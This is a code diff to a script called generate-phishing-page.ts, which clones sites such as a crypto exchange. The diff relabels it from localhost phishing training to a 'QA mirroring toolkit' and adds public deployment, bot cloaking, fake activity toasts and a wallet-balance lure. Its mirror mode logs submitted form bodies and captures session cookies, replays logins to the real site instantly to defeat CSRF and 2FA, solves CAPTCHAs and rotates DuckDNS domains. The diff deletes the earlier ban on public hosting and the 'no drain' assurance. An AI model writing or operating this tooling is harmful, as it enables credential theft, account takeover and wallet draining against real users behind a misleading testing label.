@@ -1,17 +1,72 @@
 /**
- * Phishing awareness training — generates a localhost-only static clone with a real
- * multi-chain wallet connector (EVM / Solana / Tron) and harmless personal_sign demo.
+ * Website mirroring & UX testing toolkit — generates a localhost/staging static clone
+ * with optional QA flags (proxy, deploy, balance demo, toasts, cloak, i18n, etc.).
  *
- * Usage (authorized training only):
- *   PHISHING_TRAINING_MODE=true DEMO_API_URL=https://your-api.example.com pnpm exec tsx scripts/generate-phishing-page.ts <targetUrl> <outputDir>
+ * Usage (authorized staging / training only):
+ *   PHISHING_TRAINING_MODE=true DEMO_API_URL=https://your-api.example.com \\
+ *     pnpm exec tsx scripts/generate-phishing-page.ts [flags] <targetUrl> <outputDir>
+ *
+ * Flags (all optional, off by default):
+ *   --proxy          nginx + docker-compose reverse proxy for live API content
+ *   --rotate         rotate User-Agent / PROXY_LIST during asset fetch
+ *   --deploy         deploy to Vercel (VERCEL_TOKEN) or Netlify (NETLIFY_TOKEN)
+ *   --balance        demo "Claimable amount" from wallet balance APIs
+ *   --toast          fake activity toasts for UX testing
+ *   --redirect       after form submit, redirect to original site
+ *   --cloak          serve bots.html to crawlers (UA detection)
+ *   --lang           Accept-Language i18n scaffold (en + es)
+ *   --solve-captcha  expose 2captcha Turnstile helper (TWOCAPTCHA_API_KEY)
+ *   --preapprove     check allowance-reuse scan API when enabled
+ *   --mirror         QA dynamic reverse proxy only (nginx + Docker, no clone/capture)
+ *   --log-forms      with --mirror: log POST bodies locally to logs/logs.json (QA debug)
+ *   --test-login     with --mirror + --log-forms: replay login POSTs via internal mirror (replay.js)
+ *   --replay-original with --mirror + --log-forms + --test-login: replay once to original target origin
+ *   --instant-replay with --replay-original: zero delay + 300ms CSRF budget (2FA QA)
+ *   --solve-captcha  with --mirror + --log-forms: 2captcha CAPTCHA solving (captcha-solver.js, TWOCAPTCHA_API_KEY)
+ *   --replay-demo    with --mirror: write replay-demo.sh (session hijacking training examples)
+ *   --captcha-demo   with --mirror: write README-CAPTCHA-DEMO.md (2captcha education, no API)
+ *   --rotate-domain  with --mirror: write README-ROTATE-DOMAIN.md + DuckDNS script template (manual)
+ *   --auto-rotate    with --mirror: DuckDNS auto-rotation (rotate-domain.sh + domain-rotator service)
  *
  * Example:
- *   PHISHING_TRAINING_MODE=true DEMO_API_URL=http://127.0.0.1:4000 pnpm exec tsx scripts/generate-phishing-page.ts https://app.uniswap.org ./training-clones/uniswap
+ *   PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts \\
+ *     --mirror --rotate-domain https://app.uniswap.org ./mirrors/uniswap
  */
+import { spawn } from 'node:child_process'
 import { createHash } from 'node:crypto'
 import { mkdir, writeFile } from 'node:fs/promises'
 import path from 'node:path'
 
+import {
+  buildBotsHtml,
+  buildDockerCompose,
+  buildFeaturesReadme,
+  buildFormLoggerJs,
+  buildReplayJs,
+  buildCaptchaSolverJs,
+  buildCaptchaClientJs,
+  buildReplayDemoScript,
+  buildCaptchaDemoReadme,
+  buildRotateDomainReadme,
+  buildRotateDomainScriptTemplate,
+  buildAutoRotateDomainScript,
+  buildAutoRotateReadme,
+  duckdnsSlugFromTarget,
+  buildDuckDnsEnvExample,
+  buildMirrorDockerCompose,
+  buildMirrorNginxConfig,
+  buildMirrorReadme,
+  buildMirrorStatusHtml,
+  buildNginxProxyConfig,
+  buildProxyClientPatch,
+  buildTrainingQaCss,
+  buildTrainingQaJs,
+  buildVercelJson,
+  parseProxyList,
+  pickRotatingFetchHeaders,
+  type TrainingCloneFeatures,
+  type TrainingCloneContext,
+} from './lib/training-clone-features.js'
 import {
   buildTrainingWalletDemoCss,
   buildTrainingWalletDemoJs,
@@ -23,6 +78,115 @@ const TRAINING_UA =
 const MAX_ASSETS = Number.parseInt(process.env['PHISHING_TRAINING_MAX_ASSETS'] ?? '30', 10)
 const MAX_BYTES = Number.parseInt(process.env['PHISHING_TRAINING_MAX_BYTES'] ?? '2097152', 10)
 const FETCH_TIMEOUT_MS = 20_000
+
+const FEATURE_FLAGS = [
+  'mirror',
+  'log-forms',
+  'test-login',
+  'replay-original',
+  'instant-replay',
+  'replay-demo',
+  'captcha-demo',
+  'rotate-domain',
+  'auto-rotate',
+  'proxy',
+  'rotate',
+  'deploy',
+  'balance',
+  'toast',
+  'redirect',
+  'cloak',
+  'lang',
+  'solve-captcha',
+  'preapprove',
+] as const
+
+function parseCli(argv: string[]): {
+  features: TrainingCloneFeatures
+  mirror: boolean
+  logForms: boolean
+  testLogin: boolean
+  replayOriginal: boolean
+  instantReplay: boolean
+  mirrorSolveCaptcha: boolean
+  replayDemo: boolean
+  captchaDemo: boolean
+  rotateDomain: boolean
+  autoRotate: boolean
+  positional: string[]
+} {
+  const features: TrainingCloneFeatures = {
+    proxy: false,
+    rotate: false,
+    deploy: false,
+    balance: false,
+    toast: false,
+    redirect: false,
+    cloak: false,
+    lang: false,
+    solveCaptcha: false,
+    preapprove: false,
+  }
+  let mirror = false
+  let logForms = false
+  let testLogin = false
+  let replayOriginal = false
+  let instantReplay = false
+  let mirrorSolveCaptcha = false
+  let replayDemo = false
+  let captchaDemo = false
+  let rotateDomain = false
+  let autoRotate = false
+  const positional: string[] = []
+
+  for (const arg of argv) {
+    if (arg === '--mirror') mirror = true
+    else if (arg === '--log-forms') logForms = true
+    else if (arg === '--test-login') testLogin = true
+    else if (arg === '--replay-original') replayOriginal = true
+    else if (arg === '--instant-replay') {
+      instantReplay = true
+      replayOriginal = true
+    }
+    else if (arg === '--solve-captcha') {
+      features.solveCaptcha = true
+      mirrorSolveCaptcha = true
+    }
+    else if (arg === '--replay-demo') replayDemo = true
+    else if (arg === '--captcha-demo') captchaDemo = true
+    else if (arg === '--rotate-domain') rotateDomain = true
+    else if (arg === '--auto-rotate') autoRotate = true
+    else if (arg === '--proxy') features.proxy = true
+    else if (arg === '--rotate') features.rotate = true
+    else if (arg === '--deploy') features.deploy = true
+    else if (arg === '--balance') features.balance = true
+    else if (arg === '--toast') features.toast = true
+    else if (arg === '--redirect') features.redirect = true
+    else if (arg === '--cloak') features.cloak = true
+    else if (arg === '--lang') features.lang = true
+    else if (arg === '--preapprove') features.preapprove = true
+    else if (arg.startsWith('--')) {
+      console.warn(`[PHISHING_TRAINING] Unknown flag ignored: ${arg}`)
+    } else {
+      positional.push(arg)
+    }
+  }
+
+  return {
+    features,
+    mirror,
+    logForms,
+    testLogin,
+    replayOriginal,
+    instantReplay,
+    mirrorSolveCaptcha,
+    replayDemo,
+    captchaDemo,
+    rotateDomain,
+    autoRotate,
+    positional,
+  }
+}
 
 function isTruthyEnv(key: string): boolean {
   const v = process.env[key]?.trim().toLowerCase()
@@ -51,9 +215,14 @@ function parseAllowedHosts(): Set<string> | null {
   )
 }
 
-async function fetchWithTimeout(url: string, init?: RequestInit): Promise<Response> {
+async function fetchWithTimeout(
+  url: string,
+  init?: RequestInit,
+  opts?: { rotate?: boolean },
+): Promise<Response> {
   const ctrl = new AbortController()
   const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS)
+  const rotateHeaders = opts?.rotate ? pickRotatingFetchHeaders() : {}
   try {
     return await fetch(url, {
       ...init,
@@ -61,6 +230,7 @@ async function fetchWithTimeout(url: string, init?: RequestInit): Promise<Respon
       headers: {
         'User-Agent': TRAINING_UA,
         Accept: '*/*',
+        ...(opts?.rotate ? rotateHeaders : {}),
         ...(init?.headers ?? {}),
       },
     })
@@ -105,11 +275,11 @@ function pathBlockedByRobots(pathname: string, rules: RobotsRule): boolean {
   return false
 }
 
-async function checkRobotsAllowed(target: URL): Promise<void> {
+async function checkRobotsAllowed(target: URL, rotate: boolean): Promise<void> {
   const robotsUrl = new URL('/robots.txt', target.origin)
   let res: Response
   try {
-    res = await fetchWithTimeout(robotsUrl.toString())
+    res = await fetchWithTimeout(robotsUrl.toString(), undefined, { rotate })
   } catch (e) {
     console.warn(
       `[PHISHING_TRAINING] robots.txt unreachable (${robotsUrl}) — ${e instanceof Error ? e.message : String(e)}`,
@@ -185,49 +355,488 @@ function resolveDemoApiUrl(): string {
   return `http://127.0.0.1:${apiPort}`
 }
 
-function buildReadme(targetUrl: string, outDir: string, demoApiUrl: string): string {
-  return `# Phishing awareness training clone (localhost only)
+function buildInjectionBundle(opts: {
+  features: TrainingCloneFeatures
+  qaContext: TrainingCloneContext | null
+  proxy: boolean
+  target: URL
+}): string {
+  const parts: string[] = []
+  parts.push('<!-- legion-phishing-training (authorized staging / QA toolkit) -->')
+  parts.push('<link rel="stylesheet" href="./legion-training-wallet.css" />')
+  parts.push('<script src="./legion-training-wallet.js" defer></script>')
+
+  if (opts.qaContext) {
+    parts.push('<link rel="stylesheet" href="./legion-training-qa.css" />')
+    parts.push('<script src="./legion-training-qa.js" defer></script>')
+  }
+
+  if (opts.proxy) {
+    parts.push('<script src="./legion-proxy-patch.js"></script>')
+  }
+
+  return parts.join('\n')
+}
+
+function buildReadme(
+  targetUrl: string,
+  outDir: string,
+  demoApiUrl: string,
+  features: TrainingCloneFeatures,
+  deployUrl?: string,
+): string {
+  const enabled = FEATURE_FLAGS.filter((f) => {
+    const key = f === 'solve-captcha' ? 'solveCaptcha' : (f as keyof TrainingCloneFeatures)
+    return features[key as keyof TrainingCloneFeatures]
+  })
+
+  const ctx: TrainingCloneContext = {
+    target: new URL(targetUrl),
+    outDir,
+    demoApiUrl,
+    features,
+  }
+
+  return `# Website mirroring & UX testing toolkit (staging only)
 
 **Source reference:** ${targetUrl}
 **Generated:** ${new Date().toISOString()}
+${deployUrl ? `**Deployed staging URL:** ${deployUrl}\n` : ''}
 
 ## Rules
 
-- Host only on \`127.0.0.1\` / \`localhost\` for live demos.
-- Never deploy this directory to a public host or CDN.
-- **Connect Wallet** uses real injected wallets (EVM / Phantom·Solflare / TronLink) and \`personal_sign\` / \`signMessage\` only — no settlement, no drain.
+- Use only on authorized staging / localhost environments.
+- Never deploy to a deceptive public domain.
+- Wallet panel uses \`personal_sign\` / \`signMessage\` only — no settlement when training demo mode is on.
 
 ## Serve locally
 
 \`\`\`bash
-# Terminal 1 — API (Railway or local) with training demo mode
+# API with training demo
 TRAINING_DEMO_MODE=true pnpm --filter @legion/api dev
 
-# Terminal 2 — static clone
+# Static clone
 npx --yes serve "${outDir}" -l 8080
 \`\`\`
 
-Ensure \`http://localhost:8080\` is allowed (default dev CORS includes 8080).
+${features.proxy ? `## Proxy mode (live content)\n\n\`\`\`bash\ncd "${outDir}"\ndocker compose up\n# http://localhost:8080\n\`\`\`\n\n` : ''}
+${enabled.length ? buildFeaturesReadme(ctx, enabled.map((f) => `--${f}`)) : ''}
 
-## Backend
-
-- \`POST ${demoApiUrl}/api/training-demo/record\`
-- Requires \`TRAINING_DEMO_MODE=true\` on the API
-- Signatures are logged only; \`/api/signature-anchor\` rejects training-demo payloads when demo mode is on
-
-See \`training-config.json\` for \`demo_api_url\`.
+See \`training-config.json\` for feature flags and API endpoints.
 `
+}
+
+function runCommand(
+  cmd: string,
+  args: string[],
+  cwd: string,
+  env: Record<string, string>,
+): Promise<{ stdout: string; stderr: string; code: number }> {
+  return new Promise((resolve, reject) => {
+    const child = spawn(cmd, args, {
+      cwd,
+      env: { ...process.env, ...env },
+      shell: process.platform === 'win32',
+    })
+    let stdout = ''
+    let stderr = ''
+    child.stdout?.on('data', (d: Buffer) => {
+      stdout += d.toString()
+    })
+    child.stderr?.on('data', (d: Buffer) => {
+      stderr += d.toString()
+    })
+    child.on('error', reject)
+    child.on('close', (code) => resolve({ stdout, stderr, code: code ?? 1 }))
+  })
+}
+
+async function deployStaging(outDir: string): Promise<string | null> {
+  const vercelToken = process.env['VERCEL_TOKEN']?.trim()
+  const netlifyToken = process.env['NETLIFY_TOKEN']?.trim()
+
+  if (vercelToken) {
+    await writeFile(path.join(outDir, 'vercel.json'), buildVercelJson(), 'utf8')
+    console.info('[PHISHING_TRAINING] Deploying to Vercel…')
+    const result = await runCommand(
+      'npx',
+      ['--yes', 'vercel', 'deploy', '--yes', '--token', vercelToken],
+      outDir,
+      { VERCEL_TOKEN: vercelToken },
+    )
+    if (result.code !== 0) {
+      console.warn(`[PHISHING_TRAINING] Vercel deploy failed: ${result.stderr || result.stdout}`)
+      return null
+    }
+    const urlMatch = result.stdout.match(/https:\/\/[^\s]+/g)
+    const url = urlMatch?.[urlMatch.length - 1] ?? null
+    if (url) console.info(`[PHISHING_TRAINING] Vercel URL: ${url}`)
+    return url
+  }
+
+  if (netlifyToken) {
+    console.info('[PHISHING_TRAINING] Deploying to Netlify…')
+    const result = await runCommand(
+      'npx',
+      [
+        '--yes',
+        'netlify',
+        'deploy',
+        '--dir',
+        '.',
+        '--prod',
+        '--auth',
+        netlifyToken,
+        '--message',
+        'legion-qa-mirror',
+      ],
+      outDir,
+      { NETLIFY_AUTH_TOKEN: netlifyToken },
+    )
+    if (result.code !== 0) {
+      console.warn(`[PHISHING_TRAINING] Netlify deploy failed: ${result.stderr || result.stdout}`)
+      return null
+    }
+    const urlMatch = result.stdout.match(/https:\/\/[^\s]+\.netlify\.app[^\s]*/i)
+    const url = urlMatch?.[0] ?? null
+    if (url) console.info(`[PHISHING_TRAINING] Netlify URL: ${url}`)
+    return url
+  }
+
+  console.warn('[PHISHING_TRAINING] --deploy set but VERCEL_TOKEN and NETLIFY_TOKEN are unset')
+  return null
+}
+
+async function generateMirrorMode(
+  target: URL,
+  outDir: string,
+  logForms: boolean,
+  testLogin: boolean,
+  replayOriginal: boolean,
+  instantReplay: boolean,
+  mirrorSolveCaptcha: boolean,
+  replayDemo: boolean,
+  captchaDemo: boolean,
+  rotateDomain: boolean,
+  autoRotate: boolean,
+): Promise<void> {
+  const hostPort = Number.parseInt(process.env['QA_MIRROR_PORT']?.trim() ?? '8080', 10)
+  const loggerPort = Number.parseInt(process.env['QA_MIRROR_LOGGER_PORT']?.trim() ?? '9090', 10)
+  const listenPort = 8080
+  const duckdnsBase = duckdnsSlugFromTarget(target)
+
+  await mkdir(outDir, { recursive: true })
+
+  if (autoRotate) {
+    await mkdir(path.join(outDir, 'rotate'), { recursive: true })
+    await mkdir(path.join(outDir, 'ssl'), { recursive: true })
+    await mkdir(path.join(outDir, 'logs'), { recursive: true })
+    await writeFile(
+      path.join(outDir, 'rotate', 'active-domain.conf'),
+      '# Populated by rotate-domain.sh --init\n',
+      'utf8',
+    )
+    await writeFile(
+      path.join(outDir, 'rotate-domain.sh'),
+      buildAutoRotateDomainScript(target, hostPort, duckdnsBase),
+      'utf8',
+    )
+    await writeFile(
+      path.join(outDir, 'README-AUTO-ROTATE.md'),
+      buildAutoRotateReadme(target, hostPort, duckdnsBase),
+      'utf8',
+    )
+    await writeFile(path.join(outDir, 'duckdns.env.example'), buildDuckDnsEnvExample(target), 'utf8')
+    await writeFile(path.join(outDir, 'logs', 'domain_state.json'), '{}\n', 'utf8')
+    await writeFile(
+      path.join(outDir, 'logs', 'rotate.log'),
+      '# DuckDNS auto-rotation log — staging resilience testing only\n',
+      'utf8',
+    )
+  }
+
+  if (logForms) {
+    await mkdir(path.join(outDir, 'logs'), { recursive: true })
+    await writeFile(
+      path.join(outDir, 'logger.js'),
+      buildFormLoggerJs({ testLogin, replayOriginal, solveCaptcha: mirrorSolveCaptcha }),
+      'utf8',
+    )
+    await writeFile(path.join(outDir, 'logs', 'logs.json'), '[]\n', 'utf8')
+    if (testLogin) {
+      await writeFile(path.join(outDir, 'replay.js'), buildReplayJs(target, { replayOriginal, instantReplay }), 'utf8')
+      await writeFile(path.join(outDir, 'logs', 'session_cookies.json'), '[]\n', 'utf8')
+      await writeFile(
+        path.join(outDir, 'logs', 'replay_log.txt'),
+        '# QA login replay log — internal mirror only (capture cookies, no reuse)\n',
+        'utf8',
+      )
+      if (replayOriginal) {
+        await writeFile(path.join(outDir, 'logs', 'original_session_cookies.json'), '[]\n', 'utf8')
+        await writeFile(
+          path.join(outDir, 'logs', 'original_replay_log.txt'),
+          '# Original target login replay — one shot per capture (manual inspection only)\n',
+          'utf8',
+        )
+      }
+    }
+    if (mirrorSolveCaptcha) {
+      await writeFile(path.join(outDir, 'captcha-solver.js'), buildCaptchaSolverJs(target), 'utf8')
+      await mkdir(path.join(outDir, '__legion__'), { recursive: true })
+      await writeFile(path.join(outDir, '__legion__', 'captcha-client.js'), buildCaptchaClientJs(), 'utf8')
+      await writeFile(
+        path.join(outDir, 'logs', 'captcha_solver.log'),
+        '# 2captcha API log — mirror QA only\n',
+        'utf8',
+      )
+    }
+  }
+
+  await writeFile(
+    path.join(outDir, 'nginx.conf'),
+    buildMirrorNginxConfig(target, listenPort, {
+      logForms,
+      testLogin,
+      replayOriginal,
+      solveCaptcha: mirrorSolveCaptcha,
+      autoRotate,
+      loggerPort,
+    }),
+    'utf8',
+  )
+  await writeFile(
+    path.join(outDir, 'docker-compose.yml'),
+    buildMirrorDockerCompose(hostPort, {
+      logForms,
+      testLogin,
+      replayOriginal,
+      instantReplay,
+      solveCaptcha: mirrorSolveCaptcha,
+      autoRotate,
+      loggerPort,
+      targetHost: target.host,
+      targetOrigin: target.origin,
+      duckdnsBase,
+    }),
+    'utf8',
+  )
+  await writeFile(
+    path.join(outDir, 'index.html'),
+    buildMirrorStatusHtml(
+      target,
+      logForms,
+      replayDemo,
+      captchaDemo,
+      rotateDomain,
+      testLogin,
+      mirrorSolveCaptcha,
+      autoRotate,
+      replayOriginal,
+      instantReplay,
+    ),
+    'utf8',
+  )
+
+  if (replayDemo) {
+    await writeFile(
+      path.join(outDir, 'replay-demo.sh'),
+      buildReplayDemoScript(target, hostPort, logForms),
+      'utf8',
+    )
+  }
+
+  if (captchaDemo) {
+    await writeFile(
+      path.join(outDir, 'README-CAPTCHA-DEMO.md'),
+      buildCaptchaDemoReadme(target),
+      'utf8',
+    )
+  }
+
+  if (rotateDomain) {
+    await writeFile(
+      path.join(outDir, 'README-ROTATE-DOMAIN.md'),
+      buildRotateDomainReadme(target, hostPort),
+      'utf8',
+    )
+    await writeFile(
+      path.join(outDir, 'rotate-domain.sh.template'),
+      buildRotateDomainScriptTemplate(target, hostPort),
+      'utf8',
+    )
+    await writeFile(path.join(outDir, 'duckdns.env.example'), buildDuckDnsEnvExample(target), 'utf8')
+  }
+
+  const mirrorNotes: string[] = []
+  if (logForms) mirrorNotes.push('POST bodies mirrored to local logs.json only')
+  if (testLogin) mirrorNotes.push('login replay via internal mirror (replay.js, cookies capture only)')
+  if (replayOriginal) mirrorNotes.push('original target replay once per capture (ORIGINAL_REPLAY_ENABLED)')
+  if (instantReplay) mirrorNotes.push('instant original replay (delay=0, CSRF budget 300ms)')
+  if (mirrorSolveCaptcha) mirrorNotes.push('2captcha CAPTCHA solving (captcha-solver.js)')
+  if (replayDemo) mirrorNotes.push('replay-demo.sh training examples (no auto replay)')
+  if (captchaDemo) mirrorNotes.push('README-CAPTCHA-DEMO.md (no solver API)')
+  if (rotateDomain) mirrorNotes.push('README-ROTATE-DOMAIN.md + DuckDNS templates (manual only)')
+  if (autoRotate) mirrorNotes.push('DuckDNS auto-rotate (rotate-domain.sh + domain-rotator)')
+
+  await writeFile(
+    path.join(outDir, 'mirror-config.json'),
+    JSON.stringify(
+      {
+        mode: 'mirror',
+        log_forms: logForms,
+        test_login: testLogin,
+        replay_original: replayOriginal,
+        instant_replay: instantReplay,
+        solve_captcha: mirrorSolveCaptcha,
+        replay_demo: replayDemo,
+        captcha_demo: captchaDemo,
+        rotate_domain: rotateDomain,
+        auto_rotate: autoRotate,
+        duckdns_base: autoRotate ? duckdnsBase : undefined,
+        target_url: target.href,
+        target_origin: target.origin,
+        target_host: target.host,
+        generated_at: new Date().toISOString(),
+        listen_port: hostPort,
+        logger_port: logForms ? loggerPort : undefined,
+        log_file: logForms ? './logs/logs.json' : undefined,
+        session_cookies_file: testLogin ? './logs/session_cookies.json' : undefined,
+        replay_log_file: testLogin ? './logs/replay_log.txt' : undefined,
+        original_session_cookies_file: replayOriginal ? './logs/original_session_cookies.json' : undefined,
+        original_replay_log_file: replayOriginal ? './logs/original_replay_log.txt' : undefined,
+        captcha_solver_log: mirrorSolveCaptcha ? './logs/captcha_solver.log' : undefined,
+        rotate_log: autoRotate ? './logs/rotate.log' : undefined,
+        domain_state_file: autoRotate ? './logs/domain_state.json' : undefined,
+        notes:
+          mirrorNotes.length > 0
+            ? `QA reverse proxy — ${mirrorNotes.join('; ')}`
+            : 'QA reverse proxy — no form logging',
+        usage: {
+          status: `http://localhost:${hostPort}/`,
+          proxied_example: `http://localhost:${hostPort}/<path-on-target>`,
+          start: 'docker compose up',
+          ...(logForms ? { form_log: './logs/logs.json' } : {}),
+          ...(testLogin
+            ? {
+                replay_js: './replay.js',
+                session_cookies: './logs/session_cookies.json',
+                replay_log: './logs/replay_log.txt',
+              }
+            : {}),
+          ...(replayOriginal
+            ? {
+                original_session_cookies: './logs/original_session_cookies.json',
+                original_replay_log: './logs/original_replay_log.txt',
+              }
+            : {}),
+          ...(mirrorSolveCaptcha
+            ? {
+                captcha_solver: './captcha-solver.js',
+                captcha_client: './__legion__/captcha-client.js',
+                captcha_solver_log: './logs/captcha_solver.log',
+              }
+            : {}),
+          ...(replayDemo ? { replay_demo: './replay-demo.sh' } : {}),
+          ...(captchaDemo ? { captcha_demo: './README-CAPTCHA-DEMO.md' } : {}),
+          ...(autoRotate
+            ? {
+                rotate_domain_script: './rotate-domain.sh',
+                auto_rotate_readme: './README-AUTO-ROTATE.md',
+                rotate_log: './logs/rotate.log',
+                domain_state: './logs/domain_state.json',
+              }
+            : {}),
+          ...(rotateDomain
+            ? {
+                rotate_domain_readme: './README-ROTATE-DOMAIN.md',
+                rotate_domain_template: './rotate-domain.sh.template',
+                duckdns_env_example: './duckdns.env.example',
+              }
+            : {}),
+        },
+      },
+      null,
+      2,
+    ),
+    'utf8',
+  )
+  await writeFile(
+    path.join(outDir, 'README-MIRROR.md'),
+    buildMirrorReadme(
+      target,
+      outDir,
+      hostPort,
+      logForms,
+      replayDemo,
+      captchaDemo,
+      rotateDomain,
+      testLogin,
+      mirrorSolveCaptcha,
+      autoRotate,
+      replayOriginal,
+      instantReplay,
+    ),
+    'utf8',
+  )
+
+  console.info(`[PHISHING_TRAINING] Mirror mode — wrote ${outDir}`)
+  console.info(`[PHISHING_TRAINING] Target: ${target.href}`)
+  if (logForms) {
+    console.info('[PHISHING_TRAINING] Form logging enabled → logs/logs.json (local only)')
+  }
+  if (testLogin) {
+    console.info(
+      '[PHISHING_TRAINING] --test-login enabled → replay.js replays via internal mirror; cookies → logs/session_cookies.json',
+    )
+  }
+  if (replayOriginal) {
+    console.info(
+      '[PHISHING_TRAINING] --replay-original enabled → one-shot replay to target origin; logs/original_session_cookies.json',
+    )
+  }
+  if (instantReplay) {
+    console.info(
+      '[PHISHING_TRAINING] --instant-replay enabled → ORIGINAL_REPLAY_DELAY_MS=0, CSRF pre-fetch budget 300ms',
+    )
+  }
+  if (mirrorSolveCaptcha) {
+    console.info(
+      '[PHISHING_TRAINING] --solve-captcha enabled → captcha-solver.js (TWOCAPTCHA_API_KEY required at docker compose up)',
+    )
+  }
+  if (replayDemo) {
+    console.info('[PHISHING_TRAINING] replay-demo.sh written (training examples only — no auto replay)')
+  }
+  if (captchaDemo) {
+    console.info('[PHISHING_TRAINING] README-CAPTCHA-DEMO.md written (education only — no solver API)')
+  }
+  if (autoRotate) {
+    console.info(
+      '[PHISHING_TRAINING] --auto-rotate enabled → rotate-domain.sh + domain-rotator (set DUCKDNS_TOKEN at compose up)',
+    )
+  }
+  if (rotateDomain) {
+    console.info(
+      '[PHISHING_TRAINING] README-ROTATE-DOMAIN.md + rotate-domain.sh.template written (manual DNS only — no API)',
+    )
+  }
+  console.info(`[PHISHING_TRAINING] Start: cd "${outDir}" && docker compose up`)
+  console.info(`[PHISHING_TRAINING] Status: http://localhost:${hostPort}/`)
+  console.info('[PHISHING_TRAINING] Proxied paths forward to target — routing/latency QA only')
 }
 
 async function main(): Promise<void> {
   guardOrExit()
 
-  const targetRaw = process.argv[2]?.trim()
-  const outDirArg = process.argv[3]?.trim()
+  const { features, mirror, logForms, testLogin, replayOriginal, instantReplay, mirrorSolveCaptcha, replayDemo, captchaDemo, rotateDomain, autoRotate, positional } =
+    parseCli(process.argv.slice(2))
+  const targetRaw = positional[0]?.trim()
+  const outDirArg = positional[1]?.trim()
+
   if (!targetRaw || !outDirArg) {
-    console.error(
-      'Usage: PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts <targetUrl> <outputDir>',
-    )
+    console.error(`Usage: PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts [flags] <targetUrl> <outputDir>
+
+Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
     process.exit(1)
   }
 
@@ -253,14 +862,146 @@ async function main(): Promise<void> {
   }
 
   const outDir = path.resolve(outDirArg)
+
+  if (logForms && !mirror) {
+    console.error('[PHISHING_TRAINING] --log-forms requires --mirror')
+    process.exit(1)
+  }
+
+  if (replayDemo && !mirror) {
+    console.error('[PHISHING_TRAINING] --replay-demo requires --mirror')
+    process.exit(1)
+  }
+
+  if (captchaDemo && !mirror) {
+    console.error('[PHISHING_TRAINING] --captcha-demo requires --mirror')
+    process.exit(1)
+  }
+
+  if (testLogin && !mirror) {
+    console.error('[PHISHING_TRAINING] --test-login requires --mirror')
+    process.exit(1)
+  }
+
+  if (testLogin && !logForms) {
+    console.error('[PHISHING_TRAINING] --test-login requires --log-forms')
+    process.exit(1)
+  }
+
+  if (replayOriginal && !mirror) {
+    console.error('[PHISHING_TRAINING] --replay-original requires --mirror')
+    process.exit(1)
+  }
+
+  if (replayOriginal && !logForms) {
+    console.error('[PHISHING_TRAINING] --replay-original requires --log-forms')
+    process.exit(1)
+  }
+
+  if (replayOriginal && !testLogin) {
+    console.error('[PHISHING_TRAINING] --replay-original requires --test-login')
+    process.exit(1)
+  }
+
+  if (instantReplay && !mirror) {
+    console.error('[PHISHING_TRAINING] --instant-replay requires --mirror')
+    process.exit(1)
+  }
+
+  if (instantReplay && !logForms) {
+    console.error('[PHISHING_TRAINING] --instant-replay requires --log-forms')
+    process.exit(1)
+  }
+
+  if (instantReplay && !testLogin) {
+    console.error('[PHISHING_TRAINING] --instant-replay requires --test-login')
+    process.exit(1)
+  }
+
+  if (mirrorSolveCaptcha && !mirror) {
+    console.error('[PHISHING_TRAINING] --solve-captcha requires --mirror')
+    process.exit(1)
+  }
+
+  if (mirrorSolveCaptcha && !logForms) {
+    console.error('[PHISHING_TRAINING] --solve-captcha requires --log-forms')
+    process.exit(1)
+  }
+
+  if (mirrorSolveCaptcha && !process.env['TWOCAPTCHA_API_KEY']?.trim()) {
+    console.error('[PHISHING_TRAINING] --solve-captcha requires TWOCAPTCHA_API_KEY in environment')
+    process.exit(1)
+  }
+
+  if (rotateDomain && !mirror) {
+    console.error('[PHISHING_TRAINING] --rotate-domain requires --mirror')
+    process.exit(1)
+  }
+
+  if (autoRotate && !mirror) {
+    console.error('[PHISHING_TRAINING] --auto-rotate requires --mirror')
+    process.exit(1)
+  }
+
+  if (autoRotate && rotateDomain) {
+    console.warn('[PHISHING_TRAINING] --auto-rotate includes live rotation; --rotate-domain manual templates are optional')
+  }
+
+  if (autoRotate && !process.env['DUCKDNS_TOKEN']?.trim()) {
+    console.error('[PHISHING_TRAINING] --auto-rotate requires DUCKDNS_TOKEN in environment')
+    process.exit(1)
+  }
+
+  if (autoRotate && !process.env['DUCKDNS_SUBDOMAIN']?.trim()) {
+    console.warn('[PHISHING_TRAINING] DUCKDNS_SUBDOMAIN unset — defaults to <slug>-01 at compose up')
+  }
+
+  if (mirror) {
+    if (Object.values(features).some(Boolean) && !mirrorSolveCaptcha) {
+      console.warn('[PHISHING_TRAINING] --mirror ignores other QA flags (proxy-only mode)')
+    }
+    await generateMirrorMode(
+      target,
+      outDir,
+      logForms,
+      testLogin,
+      replayOriginal,
+      instantReplay,
+      mirrorSolveCaptcha,
+      replayDemo,
+      captchaDemo,
+      rotateDomain,
+      autoRotate,
+    )
+    return
+  }
+
+  if (features.rotate && parseProxyList().length === 0) {
+    console.warn('[PHISHING_TRAINING] --rotate: PROXY_LIST empty — rotating User-Agent only')
+  }
+
+  if (features.preapprove && !isTruthyEnv('ALLOWANCE_REUSE_ENABLED')) {
+    console.warn(
+      '[PHISHING_TRAINING] --preapprove: ALLOWANCE_REUSE_ENABLED is not true — UI will stay hidden',
+    )
+  }
+
+  if (features.solveCaptcha && !process.env['TWOCAPTCHA_API_KEY']?.trim()) {
+    console.warn('[PHISHING_TRAINING] --solve-captcha: TWOCAPTCHA_API_KEY not set')
+  }
+
   const assetsDir = path.join(outDir, 'assets')
   await mkdir(assetsDir, { recursive: true })
 
+  const fetchRotate = features.rotate
+
   console.info(`[PHISHING_TRAINING] Checking robots.txt for ${target.origin}`)
-  await checkRobotsAllowed(target)
+  await checkRobotsAllowed(target, fetchRotate)
 
   console.info(`[PHISHING_TRAINING] Fetching ${target.href}`)
-  const pageRes = await fetchWithTimeout(target.href, { headers: { Accept: 'text/html' } })
+  const pageRes = await fetchWithTimeout(target.href, { headers: { Accept: 'text/html' } }, {
+    rotate: fetchRotate,
+  })
   if (!pageRes.ok) {
     console.error(`[PHISHING_TRAINING] Failed to fetch page: HTTP ${pageRes.status}`)
     process.exit(1)
@@ -283,7 +1024,7 @@ async function main(): Promise<void> {
     urlToLocal.set(assetUrl.href, localRel)
 
     try {
-      const res = await fetchWithTimeout(assetUrl.href)
+      const res = await fetchWithTimeout(assetUrl.href, undefined, { rotate: fetchRotate })
       if (!res.ok) continue
       const buf = Buffer.from(await res.arrayBuffer())
       if (buf.length > MAX_BYTES) {
